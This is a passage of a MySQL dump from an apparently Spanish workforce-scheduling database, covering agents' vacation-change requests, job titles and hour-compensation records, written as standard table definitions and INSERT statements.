  CONSTRAINT `cambios_vacaciones_ibfk_2` FOREIGN KEY (`codigo_agente2`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cambios_vacaciones`
--

LOCK TABLES `cambios_vacaciones` WRITE;
/*!40000 ALTER TABLE `cambios_vacaciones` DISABLE KEYS */;
INSERT INTO `cambios_vacaciones` VALUES (1,196,'2018-01-29','2018-02-18',126,'2018-02-19','2018-02-11','Motivos personales',1,'2018-01-21 00:00:00','2018-01-21 19:51:27'),(2,375,'2018-01-29','2018-02-18',381,'2018-01-08','2018-01-28','Motivos personales',1,'2018-01-21 00:00:00','2018-01-21 20:09:40'),(4,155,'2018-02-19','2018-03-11',NULL,'2018-01-29','2018-02-18','PERSONALES',1,'2018-02-01 00:00:00','2018-02-01 05:49:52'),(5,155,'2018-07-02','2018-07-22',NULL,'2018-05-21','2018-06-10','PERSONALES',1,'2018-02-01 00:00:00','2018-02-01 05:50:38'),(6,155,'2018-10-15','2018-11-04',NULL,'2018-12-17','2019-01-06','PERSONALES',1,'2018-02-01 00:00:00','2018-02-01 05:51:13'),(7,200,'2018-06-11','2018-07-01',NULL,'2018-07-23','2018-08-12','CAMBIO SOLICITADO POR EL AGENTE',1,'2018-02-02 00:00:00','2018-02-02 08:50:15'),(8,102,'2018-06-18','2018-07-15',193,'2018-08-13','2018-09-09','Motivos personales correo del 2/02/18',1,'2018-02-02 00:00:00','2018-02-02 08:53:16'),(9,385,'2018-03-19','2018-04-08',NULL,'2018-07-02','2018-07-22','PARTICIPACION PROYECTO NEPAL',1,'2018-02-06 00:00:00','2018-02-06 12:19:03'),(10,245,'2018-08-13','2018-09-02',239,'2018-07-02','2018-07-22','CAMBIO ENTRE AGENTES',1,'2018-02-20 00:00:00','2018-02-20 06:57:42'),(11,190,'2018-05-21','2018-05-27',NULL,'2018-05-07','2018-05-13','CAMBIO DE UNA SEMANA DE VACACIONES POR ASUSNTOS PERSONALES',1,'2018-02-20 00:00:00','2018-02-20 09:03:18'),(12,190,'2018-05-28','2018-06-03',NULL,'2018-06-11','2018-06-17','Atrasar una semana las vacaciones',1,'2018-03-12 00:00:00','2018-03-12 07:14:38'),(13,355,'2018-09-03','2018-09-23',NULL,'2018-07-23','2018-08-12','Personales',1,'2018-05-08 00:00:00','2018-05-08 05:22:45'),(14,129,'2018-08-13','2018-09-02',NULL,'2018-08-20','2018-09-09','MOTIVOS PERSONALES',1,'2018-06-29 00:00:00','2018-06-29 07:29:35'),(15,1000,'2018-08-06','2018-08-26',NULL,'2018-08-13','2018-09-02','',1,'2018-08-12 00:00:00','2018-09-18 08:29:58'),(17,200,'2018-09-24','2018-09-30',NULL,'2018-10-15','2018-10-21','Personales',1,'2018-12-09 00:00:00','2018-09-12 07:29:52'),(20,375,'2018-10-01','2018-10-07',381,'2018-12-17','2018-12-23','',1,'2018-09-17 16:43:25','2018-09-17 16:44:28'),(21,375,'2018-10-08','2018-10-14',159,'2018-12-10','2018-12-16','',1,'2018-09-17 16:44:20','2018-09-17 16:44:47'),(22,200,'2019-04-08','2019-04-14',NULL,'2019-05-06','2019-05-12','Personales',1,'2018-04-12 00:00:00','2018-12-04 06:20:12'),(23,381,'2019-02-25','2019-03-17',NULL,'2019-01-28','2019-02-17','',1,'2019-07-01 00:00:00','2019-01-07 11:34:17'),(24,393,'2019-01-14','2019-02-03',NULL,'2019-02-11','2019-03-03','',0,'2019-07-01 00:00:00','2019-01-07 11:34:56'),(27,63,'2019-08-12','2019-09-01',NULL,'2019-09-02','2019-09-22','SOLICITADO PARA COINCIDIR CON SU PAREJA',1,'2019-01-22 11:13:08','2021-01-18 10:03:10'),(28,143,'2019-05-20','2019-06-02',NULL,'2019-04-15','2019-05-05','Solicitado agente viaje a japon',1,'2019-01-23 09:16:35','2019-03-20 14:53:57'),(29,143,'2019-06-03','2019-06-09',NULL,'2019-04-29','2019-05-05','solilcitado agente viaje a japon',1,'2019-03-21 08:12:19','2019-03-21 08:12:42'),(30,155,'2019-06-03','2019-06-09',NULL,'2019-07-01','2019-07-07','PERSONALES',1,'2019-05-30 04:55:45','2019-05-30 04:56:09'),(31,155,'2019-02-04','2019-02-24',NULL,'2019-02-25','2019-03-17','PETICION PROPIA',1,'2019-06-06 10:45:43','2019-06-06 10:48:44'),(32,155,'2019-06-10','2019-06-30',NULL,'2019-07-01','2019-07-21','PETICION PROPIA',1,'2019-06-06 10:47:03','2019-06-06 10:48:49'),(33,155,'2019-09-23','2019-10-13',NULL,'2019-10-14','2019-11-03','PETICION PROPIA',1,'2019-06-06 10:48:32','2019-06-06 10:48:53'),(34,196,'2019-08-26','2019-09-01',159,'2019-10-21','2019-10-27','personal',1,'2019-06-18 18:01:59','2019-06-24 09:54:18'),(35,129,'2019-11-04','2019-11-24',NULL,'2019-08-19','2019-09-08','MOTIVOS PERSONALES',1,'2019-07-18 04:57:33','2019-07-18 04:59:40'),(36,233,'2020-08-31','2020-09-20',228,'2020-08-10','2020-08-30','CAMBIO DE VACACIONES ENTRE ELLOS.',1,'2019-12-19 13:52:21','2019-12-19 13:52:51'),(38,375,'2020-01-13','2020-02-02',NULL,'2020-09-21','2020-10-11','',1,'2020-01-03 07:41:21','2020-01-03 07:41:42'),(39,381,'2020-02-17','2020-02-23',NULL,'2020-01-27','2020-02-02','',1,'2020-01-03 07:44:04','2020-01-03 07:44:10'),(40,200,'2020-01-13','2020-02-02',NULL,'2020-11-02','2020-11-22','',1,'2020-01-03 07:52:06','2020-01-03 07:54:08'),(41,155,'2020-04-06','2020-04-26',NULL,'2020-02-03','2020-02-23','ACUERDO TRABAJADOR/EMPRESA',1,'2020-01-03 08:14:20','2020-01-03 08:15:43'),(42,155,'2020-08-31','2020-09-20',NULL,'2020-06-08','2020-06-28','ACUERDO TRABAJADOR/EMPRESA',1,'2020-01-03 08:14:56','2020-01-03 08:15:49'),(43,155,'2020-11-30','2020-12-20',NULL,'2020-09-21','2020-10-11','ACUERDO TRABAJADOR/EMPRESA',1,'2020-01-03 08:15:37','2020-01-03 08:15:54'),(44,140,'2020-03-09','2020-03-22',NULL,'2020-05-04','2020-05-17','CAMBIO DE FECHAS POR M. PERSONALES\r\nRECHAZADAS POR NO CONOCER LOS RECURSOS DISPONIBLES PARA GARANTIZAR LA COBERTURA DEL TURNO',2,'2020-01-23 18:16:13','2020-01-31 10:59:51'),(45,393,'2020-03-16','2020-03-22',207,'2020-02-24','2020-03-01','Personales',1,'2020-01-28 07:46:23','2020-01-28 11:20:27'),(46,393,'2020-07-20','2020-08-09',NULL,'2020-08-10','2020-08-30','',1,'2020-06-18 11:57:42','2020-06-18 11:58:09'),(47,375,'2020-08-10','2020-08-30',NULL,'2020-08-24','2020-09-13','',1,'2020-06-18 11:58:38','2020-07-16 11:17:24'),(48,200,'2020-08-10','2020-08-16',NULL,'2020-08-31','2020-09-06','Motivos personales',1,'2020-07-03 06:38:34','2020-07-03 06:38:47'),(49,393,'2020-03-23','2020-04-05',NULL,'2020-12-28','2021-01-10','',1,'2020-09-22 07:40:28','2020-09-22 07:41:26'),(50,393,'2020-11-16','2020-11-22',NULL,'2020-12-21','2020-12-27','',1,'2020-09-22 07:41:12','2020-09-22 07:41:31'),(51,393,'2020-11-02','2020-11-15',NULL,'2021-09-20','2021-10-03','Cambio de vacaciones solicitado por el servicio, a devolver el prГіximo aГұo',0,'2020-11-03 10:50:54','2021-07-13 05:45:24'),(52,192,'2020-11-30','2020-12-13',NULL,'2021-03-01','2021-03-14','Cambio solicitado vacaciones por el servicio las fechas del 2021 son para completar pero no son las fechas reales del cambio',0,'2020-11-18 10:18:55','2020-11-18 10:18:55'),(53,233,'2021-09-06','2021-09-26',431,'2021-07-26','2021-08-15','cambio de vacaciones entre ellos.',1,'2021-01-18 10:04:41','2021-01-18 10:05:08'),(54,421,'2020-11-23','2020-11-29',NULL,'2021-10-25','2021-10-31','Las fechas no son reales, se le debe una semana de vacaciones del 2020 a devolver en 2021, por error del Jefe de PM',0,'2021-02-03 09:02:59','2021-02-03 09:02:59'),(55,190,'2021-04-12','2021-05-02',NULL,'2021-04-19','2021-05-09','Solicito retrasar una semana las vacaciones por motivos personales (Barajan la primera semana de mayo como posible fecha de graduaciГіn para los del 2020)',1,'2021-02-05 10:42:37','2021-02-08 07:15:35'),(56,180,'2021-06-14','2021-06-20',NULL,'2021-09-20','2021-09-26','CAMBIO DE VACIONES SOLICITADAS POR EL SERVICIO BAJA JOSE RAMON ',1,'2021-06-11 10:49:43','2021-09-06 10:49:37'),(57,448,'2021-08-30','2021-09-12',449,'2021-09-20','2021-10-03','PERSONALES',0,'2021-07-29 05:44:21','2021-07-29 05:44:21'),(59,200,'2022-02-28','2022-03-20',NULL,'2022-09-05','2022-09-25','',1,'2022-02-01 07:01:45','2022-02-01 07:51:58'),(60,196,'2022-01-28','2022-01-30',NULL,'2022-09-16','2022-09-18','BAJA EN VACACIONES',1,'2022-07-26 05:38:14','2022-07-26 05:38:35'),(61,393,'2023-05-08','2023-05-14',NULL,'2023-02-27','2023-03-05','',0,'2022-11-21 06:20:34','2022-11-21 06:20:34'),(62,196,'2024-08-26','2024-09-01',207,'2024-05-20','2024-05-26','ocio',1,'2024-02-01 11:59:46','2024-02-01 12:06:20'),(63,382,'2025-04-14','2025-04-27',217,'2025-02-24','2025-03-09','Acuerdo',0,'2024-12-24 10:00:37','2024-12-24 10:00:37');
/*!40000 ALTER TABLE `cambios_vacaciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cargos`
--

DROP TABLE IF EXISTS `cargos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cargos` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `cargo` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`Id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cargos`
--

LOCK TABLES `cargos` WRITE;
/*!40000 ALTER TABLE `cargos` DISABLE KEYS */;
INSERT INTO `cargos` VALUES (1,'JEFE DE ESTACION'),(2,'TECNICO RED'),(4,'TECNICO DE P.M.'),(5,'JEFE DE SERVICIO'),(6,'TECNICO ESTACION'),(8,'TECNICO DE RED HABILITADO'),(9,'TECNICO DE P.M. INTEGRAL');
/*!40000 ALTER TABLE `cargos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `computo_devoluciones`
--

DROP TABLE IF EXISTS `computo_devoluciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `computo_devoluciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `computo_id` int(11) NOT NULL,
  `devolucion_date` date NOT NULL,
  `devolucion` bigint(20) NOT NULL,
  `status` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `computo_id` (`computo_id`),
  CONSTRAINT `computo_devoluciones_ibfk_1` FOREIGN KEY (`computo_id`) REFERENCES `computos` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=859 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `computo_devoluciones`
--

LOCK TABLES `computo_devoluciones` WRITE;
/*!40000 ALTER TABLE `computo_devoluciones` DISABLE KEYS */;
INSERT INTO `computo_devoluciones` VALUES (3,1621,'2018-05-12',444,0),(4,1621,'2018-05-13',444,0),(5,1621,'2018-02-25',444,0),(6,1603,'2018-03-21',505,0),(7,1653,'2018-03-10',520,0),(8,1639,'2018-03-29',485,0),(9,1639,'2018-03-30',485,0),(10,1661,'2018-02-28',540,0),(11,1615,'2018-06-24',540,0),(12,1615,'2018-06-25',515,0),(18,1649,'2018-04-05',450,0),(19,1649,'2018-04-08',460,0),(20,1655,'2018-04-13',444,0),(21,1611,'2018-06-19',535,0),(22,1611,'2018-06-20',535,0),(23,1611,'2018-06-21',535,0),(24,1611,'2018-06-22',540,0),(25,1611,'2018-06-23',505,0),(26,1611,'2018-06-24',505,0),(27,1603,'2018-08-11',515,0),(28,1603,'2018-08-12',515,0),(29,1610,'2018-05-08',150,0),(32,1628,'2018-05-04',444,0),(33,1628,'2018-05-05',444,0),(34,1628,'2018-05-12',444,0),(35,1620,'2018-06-11',444,0),(36,1620,'2018-06-12',444,0),(37,1620,'2018-06-13',444,0),(38,1620,'2018-06-14',444,0),(39,1620,'2018-06-15',444,0),(40,1620,'2018-06-18',444,0),(41,1620,'2018-06-19',444,0),(42,1620,'2018-06-20',444,0),(43,1620,'2018-06-21',444,0),(44,1620,'2018-06-22',444,0),(45,1643,'2018-05-10',540,0),(46,1643,'2018-05-11',540,0),(47,1649,'2018-06-02',460,0),(48,1649,'2018-06-03',460,0),(49,1621,'2018-06-25',444,0),(50,1621,'2018-06-26',444,0),(51,1621,'2018-06-27',444,0),(52,1621,'2018-06-28',444,0),(53,1621,'2018-06-29',444,0),(54,1661,'2018-06-06',540,0),(55,1661,'2018-06-13',540,0),(56,1606,'2018-05-25',535,0),(57,1624,'2018-05-18',444,0),(58,1624,'2018-06-13',444,0),(59,1624,'2018-06-14',444,0),(60,1656,'2018-07-02',444,0),(61,1656,'2018-07-03',444,0),(62,1656,'2018-07-04',444,0),(63,1656,'2018-07-05',444,0),(64,1656,'2018-07-06',444,0),(65,1593,'2018-06-10',485,0),(66,1619,'2018-07-02',444,0),(67,1619,'2018-07-03',444,0),(68,1619,'2018-07-04',444,0),(69,1619,'2018-07-05',444,0),(70,1619,'2018-07-06',444,0),(71,1619,'2018-07-09',444,0),(72,1619,'2018-07-10',444,0),(73,1619,'2018-07-11',444,0),(74,1619,'2018-07-12',444,0),(75,1619,'2018-07-13',444,0),(76,1653,'2018-07-23',520,0),(77,1653,'2018-07-24',520,0),(78,1653,'2018-07-25',525,0),(79,1653,'2018-07-26',525,0),(80,1653,'2018-07-27',525,0),(83,1644,'2018-07-30',444,0),(84,1644,'2018-07-31',444,0),(85,1644,'2018-08-01',444,0),(86,1644,'2018-08-02',444,0),(87,1644,'2018-08-03',444,0),(88,1644,'2018-08-06',444,0),(89,1629,'2018-08-02',535,0),(90,1629,'2018-08-03',535,0),(92,1629,'2018-08-04',485,0),(93,1629,'2018-08-05',485,0),(94,1629,'2018-08-06',535,0),(95,1629,'2018-08-07',535,0),(96,1629,'2018-08-08',535,0),(97,1629,'2018-08-11',450,0),(98,1629,'2018-08-12',450,0),(100,1629,'2018-08-13',540,0),(101,1629,'2018-08-14',540,0),(102,1629,'2018-08-15',450,0),(103,1629,'2018-08-16',540,0),(104,1629,'2018-08-17',540,0),(105,1629,'2018-08-22',420,0),(106,1629,'2018-08-23',535,0),(107,1629,'2018-08-24',535,0),(109,1629,'2018-08-25',540,0),(110,1629,'2018-09-27',535,0),(116,1640,'2018-07-28',495,0),(117,1640,'2018-08-07',540,0),(118,1640,'2018-08-08',540,0),(119,1640,'2018-08-09',540,0),(120,1648,'2018-08-10',520,0),(121,1648,'2018-08-11',545,0),(122,1648,'2018-08-12',545,0),(123,1648,'2018-08-13',490,0),(124,1648,'2018-08-14',520,0),(125,1648,'2018-08-15',520,0),(126,1648,'2018-08-16',520,0),(127,1648,'2018-08-21',540,0),(128,1621,'2018-08-11',465,0),(129,1621,'2018-08-12',465,0),(130,1629,'2018-11-14',420,0),(131,1629,'2018-11-15',535,0),(132,1629,'2018-11-16',535,0),(133,1629,'2018-11-17',540,0),(134,1629,'2018-11-19',535,0),(135,1629,'2018-11-20',535,0),(136,1629,'2018-11-21',535,0),(137,1621,'2018-07-07',444,0),(138,1621,'2018-07-08',444,0),(139,1652,'2018-06-16',425,0),(140,1622,'2018-07-16',444,0),(141,1622,'2018-07-17',444,0),(142,1622,'2018-07-18',444,0),(143,1622,'2018-07-19',444,0),(144,1622,'2018-07-20',444,0),(145,1606,'2018-06-15',535,0),(146,1631,'2018-08-13',540,0),(147,1631,'2018-08-14',540,0),(148,1631,'2018-08-15',540,0),(149,1631,'2018-08-16',540,0),(150,1631,'2018-08-17',540,0),(151,1606,'2018-06-29',540,0),(152,1618,'2018-07-23',444,0),(153,1618,'2018-07-24',444,0),(154,1618,'2018-07-25',444,0),(155,1618,'2018-07-26',444,0),(156,1618,'2018-07-27',444,0),(162,1655,'2018-11-05',444,0),(163,1655,'2018-11-06',444,0),(164,1641,'2018-09-08',545,0),(165,1641,'2018-09-09',545,0),(166,1610,'2018-06-26',490,0),(167,1653,'2018-08-31',520,0),(168,1652,'2018-07-09',540,0),(169,1661,'2018-07-13',540,0),(170,1627,'2018-09-21',444,0),(171,1628,'2018-11-12',444,0),(172,1628,'2018-11-13',444,0),(173,1628,'2018-11-14',444,0),(174,1628,'2018-11-15',444,0),(175,1652,'2018-08-17',520,0),(176,1643,'2018-08-15',485,0),(177,1644,'2018-08-27',444,0),(178,1644,'2018-08-28',444,0),(179,1644,'2018-08-29',444,0),(180,1644,'2018-08-30',444,0),(181,1644,'2018-08-31',444,0),(182,1644,'2018-09-03',444,0),(183,1644,'2018-09-04',444,0),(184,1644,'2018-09-05',444,0),(185,1644,'2018-09-06',444,0),(186,1644,'2018-09-07',444,0),(187,1619,'2018-09-03',444,0),(188,1619,'2018-09-04',444,0),(189,1619,'2018-09-05',444,0),(190,1619,'2018-09-06',444,0),(191,1619,'2018-09-07',444,0),(193,1735,'2018-08-25',480,1),(194,1622,'2018-08-27',444,0),(195,1622,'2018-08-28',444,0),(196,1622,'2018-08-29',444,0),(197,1622,'2018-08-30',444,0),(198,1622,'2018-08-31',444,0),(199,1620,'2018-08-31',444,0),(200,1620,'2018-09-01',444,0),(201,1620,'2018-09-02',444,0),(202,1620,'2018-09-03',444,0),(203,1620,'2018-09-04',444,0),(204,1620,'2018-09-05',444,0),(205,1620,'2018-09-06',444,0),(206,1620,'2018-09-07',444,0),(209,1591,'2018-08-21',450,0),(210,1591,'2018-08-22',450,0),(211,1591,'2018-05-02',450,0),(212,1591,'2018-05-03',450,0),(213,1591,'2018-05-04',450,0),(214,1591,'2018-06-21',450,0),(215,1591,'2018-06-22',450,0),(216,1591,'2018-06-25',450,0),(220,1656,'2018-11-12',444,0),(221,1656,'2018-11-13',444,0),(222,1656,'2018-11-14',444,0),(223,1656,'2018-11-15',444,0),(224,1656,'2018-11-16',444,0),(239,1604,'2018-09-21',535,1),(240,1604,'2018-09-22',485,1),(241,1604,'2018-09-20',475,1),(242,1610,'2018-10-12',490,0),(243,1610,'2018-10-14',505,0),(244,1735,'2018-10-22',535,1),(245,1735,'2018-12-21',520,0),(246,1621,'2018-09-24',444,0),(247,1621,'2018-09-25',444,0),(248,1621,'2018-09-26',444,0),(249,1619,'2018-10-01',444,0),(250,1619,'2018-10-02',444,0),(251,1619,'2018-10-03',444,0),(252,1619,'2018-10-04',444,0),(253,1619,'2018-10-05',444,0),(257,1621,'2018-10-11',444,0),(258,1646,'2018-10-05',540,0),(261,1613,'2018-11-01',540,0),(262,1613,'2018-11-02',530,0),(263,1613,'2018-11-03',515,0),(264,1613,'2018-11-04',515,0),(265,1613,'2018-10-31',540,0),(266,1623,'2018-10-08',444,0),(267,1623,'2018-10-09',444,0),(268,1623,'2018-10-10',444,0),(269,1623,'2018-10-11',444,0),(270,1623,'2018-10-12',444,0),(271,1649,'2018-10-21',460,0),(274,1625,'2018-10-24',444,0),(276,1625,'2018-10-26',444,0),(277,1623,'2018-10-27',444,0),(278,1623,'2018-10-28',444,0),(279,1649,'2018-11-18',550,0),(280,1610,'2019-01-04',490,0),(281,1610,'2019-01-05',490,0),(282,1610,'2019-01-06',505,0),(283,1661,'2018-11-21',540,0),(284,1618,'2018-11-29',444,1),(285,1618,'2018-11-30',444,1),(286,1618,'2018-12-03',444,1),(287,1618,'2018-12-04',444,1),(288,1618,'2018-12-05',444,1),(289,1618,'2018-12-06',444,1),(290,1618,'2018-12-07',444,1),(291,1619,'2018-12-21',444,1),(292,1607,'2018-12-14',505,1),(296,1644,'2018-12-10',444,1),(297,1644,'2018-12-11',444,1),(298,1644,'2018-12-12',444,1),(299,1644,'2018-12-13',444,1),(300,1644,'2018-12-14',444,1),(301,1629,'2018-08-28',535,1),(302,1629,'2018-08-29',535,1),(303,1649,'2018-12-06',450,0),(304,1618,'2018-12-14',444,0),(305,1621,'2018-12-22',444,0),(306,1621,'2018-12-23',444,0),(307,1652,'2019-01-03',520,1),(308,1656,'2018-12-26',444,0),(309,1600,'2018-12-28',485,1),(311,1600,'2018-12-30',535,1),(314,1613,'2018-12-31',444,1),(315,1613,'2019-01-02',535,1),(316,1839,'2019-01-08',444,1),(317,1836,'2019-01-08',444,1),(318,1818,'2019-01-26',485,1),(319,1798,'2019-02-06',505,1),(320,1817,'2019-02-12',540,1),(321,1817,'2019-02-13',540,1),(322,1809,'2019-05-03',535,1),(323,1798,'2019-07-18',505,1),(326,1798,'2019-07-19',505,1),(327,1798,'2019-07-20',505,1),(328,1798,'2019-07-22',505,1),(329,1798,'2019-07-23',505,1),(330,1798,'2019-07-24',505,1),(331,1803,'2019-12-24',540,1),(332,1803,'2019-12-25',450,1),(334,1809,'2019-05-16',505,1),(335,1809,'2019-05-17',505,1),(336,1797,'2019-08-24',450,1),(337,1797,'2019-08-25',450,1),(338,1797,'2019-08-26',540,1),(339,1839,'2019-05-10',444,1),(341,1849,'2019-03-27',444,1),(342,1795,'2019-03-27',535,1),(343,1844,'2019-03-27',444,0),(344,1842,'2019-03-27',444,0),(345,1839,'2019-05-11',444,0),(346,1839,'2019-05-12',444,0),(347,1839,'2019-03-27',444,1),(348,1842,'2019-05-18',444,0),(349,1842,'2019-05-19',444,0),(352,1820,'2019-08-31',485,1),(356,1795,'2019-04-02',540,0),(357,1795,'2019-04-03',540,0),(358,1795,'2019-04-04',540,0),(359,1822,'2019-08-06',525,1),(360,1822,'2019-08-07',525,1),(361,1822,'2019-11-10',490,1),(362,1911,'2019-04-18',506,1),(363,1911,'2019-04-19',488,1),(364,1911,'2019-04-27',480,0),(366,1797,'2019-05-02',535,1),(370,1824,'2019-05-12',490,1),(371,1817,'2019-06-13',540,0),(372,1817,'2019-06-14',540,0),(373,1800,'2019-05-08',460,0),(374,1800,'2019-05-07',460,0),(375,1844,'2019-06-21',444,0),(376,1844,'2019-06-22',444,0),(377,1844,'2019-06-23',444,0),(378,1838,'2019-06-16',444,0),(379,1837,'2019-05-12',444,0),(380,1837,'2019-05-11',421,0),(381,1812,'2020-01-01',480,1),(382,1841,'2019-06-24',444,1),(383,1841,'2019-06-25',444,1),(384,1841,'2019-06-26',444,1),(385,1841,'2019-06-27',444,1),(386,1841,'2019-06-28',444,1),(387,1814,'2019-09-07',450,1),(390,1836,'2019-07-14',444,0),(391,1809,'2019-03-21',530,1),(394,1836,'2019-06-29',444,1),(395,1836,'2019-06-28',444,1),(396,1834,'2019-07-31',495,1),(397,1834,'2019-08-01',525,1),(398,1834,'2019-08-02',525,1),(399,1838,'2019-08-03',420,1),(400,1838,'2019-08-04',444,1),(401,1816,'2019-08-12',490,1),(402,1828,'2019-07-30',444,1),(403,1828,'2019-07-31',444,1),(404,1828,'2019-08-01',444,1),(405,1828,'2019-08-02',444,1),(406,1841,'2019-08-31',490,1),(407,1848,'2019-11-02',444,1),(408,1848,'2019-11-03',444,1),(409,1805,'2019-09-07',530,1),(410,1805,'2019-09-08',525,1),(412,1835,'2019-11-11',444,1),(413,1911,'2019-09-13',479,1),(414,1800,'2019-09-27',444,1),(415,1800,'2019-10-05',444,1),(417,1836,'2019-12-28',444,0),(418,1836,'2019-12-29',444,0),(419,1824,'2019-12-06',515,1),(420,1824,'2019-12-07',515,1),(421,1824,'2019-12-08',515,1),(422,1824,'2019-12-09',540,1),(423,1819,'2019-10-12',444,1),(424,1839,'2019-12-23',444,0),(425,1622,'2019-12-24',444,0),(426,1622,'2019-12-25',444,0),(428,1836,'2019-12-21',444,0),(429,1836,'2019-12-22',444,0),(430,1850,'2019-12-05',444,1),(431,1850,'2019-12-04',444,1),(432,1850,'2019-12-03',444,1),(433,1805,'2019-11-14',444,0),(435,1818,'2019-11-16',485,1),(436,1844,'2019-12-13',444,1),(437,1805,'2019-11-30',470,1),(438,1805,'2019-12-01',525,1),(439,1805,'2019-12-30',500,1),(440,1840,'2019-12-05',525,1),(441,1840,'2019-12-06',495,1),(444,1807,'2019-12-19',535,1),(445,1807,'2019-12-20',535,1),(446,1835,'2019-12-28',444,1),(447,1835,'2019-12-29',444,1),(448,1835,'2019-12-30',444,1),(449,1835,'2019-12-31',444,1),(453,1990,'2020-03-06',540,1),(454,1990,'2020-03-07',535,1),(455,1990,'2020-03-08',535,1),(463,1968,'2020-08-19',535,1),(464,1968,'2020-08-20',535,1),(465,1968,'2020-08-22',505,1),(466,1968,'2020-08-23',505,1),(467,1968,'2020-08-18',535,1),(468,1974,'2020-08-03',540,1),(477,1980,'2020-08-06',505,1),(478,1980,'2020-08-07',505,1),(479,1980,'2020-08-18',525,1),(480,1980,'2020-08-19',525,1),(481,2004,'2020-07-15',444,1),(482,2004,'2020-07-16',444,1),(483,2004,'2020-07-20',444,1),(484,2004,'2020-07-21',444,1),(486,2003,'2020-08-25',525,1),(487,1961,'2020-08-20',540,1),(488,1961,'2020-08-21',540,1),(489,1999,'2020-07-11',444,1),(490,1995,'2020-06-15',420,1),(491,1979,'2020-07-30',444,1),(492,1986,'2020-08-10',535,1),(493,1986,'2020-08-11',535,1),(494,1986,'2020-08-12',535,1),(495,2003,'2020-08-24',525,1),(496,2003,'2020-08-20',525,1),(497,1978,'2020-10-05',444,1),(498,1978,'2020-10-06',444,1),(499,1978,'2020-10-07',444,1),(500,1978,'2020-10-08',444,1),(501,1978,'2020-10-09',444,1),(502,2003,'2020-08-19',525,1),(503,1986,'2020-09-16',420,1),(504,1986,'2020-09-18',535,1),(505,1986,'2020-09-17',535,1),(506,1967,'2020-09-18',535,1),(507,1967,'2020-09-19',470,1),(508,1967,'2020-09-20',525,1),(509,1649,'2020-09-17',450,1),(510,1618,'2020-09-14',444,0),(511,1618,'2020-09-20',308,0),(512,1963,'2020-09-16',480,1),(513,1621,'2020-10-12',360,1),(514,2003,'2020-10-03',460,1),(515,1999,'2020-11-14',444,1),(516,1999,'2020-11-15',444,1),(519,1999,'2020-12-19',444,0),(520,1999,'2020-12-20',444,0),(521,1999,'2020-11-16',444,1),(522,1977,'2020-11-21',500,0),(523,1977,'2020-11-22',500,0),(524,1977,'2020-11-23',505,0),(525,1977,'2020-11-24',505,0),(527,2000,'2020-10-21',444,1),(528,2006,'2020-11-06',444,1),(529,2006,'2020-11-27',444,0),(531,2006,'2020-12-06',444,0),(533,2006,'2020-12-05',444,0),(534,1969,'2020-12-21',505,1),(535,1969,'2020-12-22',505,1),(536,1999,'2020-12-05',444,1),(537,1999,'2020-12-06',444,1),(538,1996,'2020-12-11',480,1),(539,2006,'2020-12-19',435,1),(540,2006,'2020-12-20',444,1),(541,1966,'2020-12-30',420,1),(542,2164,'2021-02-10',540,1),(543,2126,'2021-08-10',540,1),(544,2126,'2021-08-11',540,1),(545,2126,'2021-08-12',540,1),(546,2132,'2021-03-11',495,1),(547,2163,'2021-07-05',444,1),(548,2163,'2021-07-06',444,1),(549,2163,'2021-07-07',444,1),(550,2163,'2021-07-08',444,1),(551,2163,'2021-07-09',444,1),(552,2164,'2021-03-31',505,1),(553,2163,'2021-08-11',444,1),(554,2163,'2021-08-12',444,1),(555,2163,'2021-08-13',444,1),(556,2133,'2021-08-21',425,1),(557,2133,'2021-08-22',425,1),(560,2131,'2021-08-20',525,1),(561,2131,'2021-08-21',495,1),(562,2131,'2021-08-22',495,1),(563,2131,'2021-08-24',490,1),(564,2164,'2021-04-27',540,1),(565,2132,'2021-07-23',550,1),(566,2132,'2021-07-24',530,1),(567,2132,'2021-07-25',530,1),(571,2151,'2021-08-22',460,1),(574,2129,'2021-08-17',535,1),(575,2129,'2021-08-18',535,1),(576,2161,'2021-08-14',444,1),(577,2161,'2021-08-15',420,1),(578,2119,'2021-06-14',505,1),(579,2130,'2021-07-01',444,1),(580,2130,'2021-07-06',540,1),(581,2130,'2021-07-07',540,1),(582,2127,'2021-09-23',505,1),(583,2127,'2021-09-24',505,1),(584,2127,'2021-09-25',505,1),(585,2127,'2021-09-27',505,1),(586,2127,'2021-09-28',505,1),(587,2127,'2021-09-29',505,1),(588,2158,'2021-06-29',450,1),(589,2158,'2021-06-30',450,1),(590,2158,'2021-07-15',495,1),(591,2158,'2021-07-16',540,1),(592,2131,'2021-08-25',490,1),(597,2132,'2021-07-19',520,1),(598,2126,'2021-06-21',540,1),(599,2126,'2021-06-22',530,1),(600,2126,'2021-06-23',530,1),(601,2126,'2021-06-24',530,1),(602,2126,'2021-06-29',535,1),(603,2168,'2021-07-08',475,1),(604,2150,'2019-12-11',480,0),(605,2164,'2021-08-15',505,1),(606,2130,'2021-08-31',535,1),(607,2162,'2021-06-26',480,1),(608,2162,'2021-06-27',480,1),(609,2162,'2021-06-28',480,1),(610,2162,'2021-06-29',480,1),(611,2162,'2021-06-30',480,1),(612,2162,'2021-07-01',480,1),(613,2145,'2021-07-26',540,1),(614,2121,'2021-09-11',490,1),(615,2121,'2021-09-12',505,1),(616,2121,'2021-09-13',500,1),(617,2135,'2021-07-15',444,1),(618,2148,'2021-09-21',480,1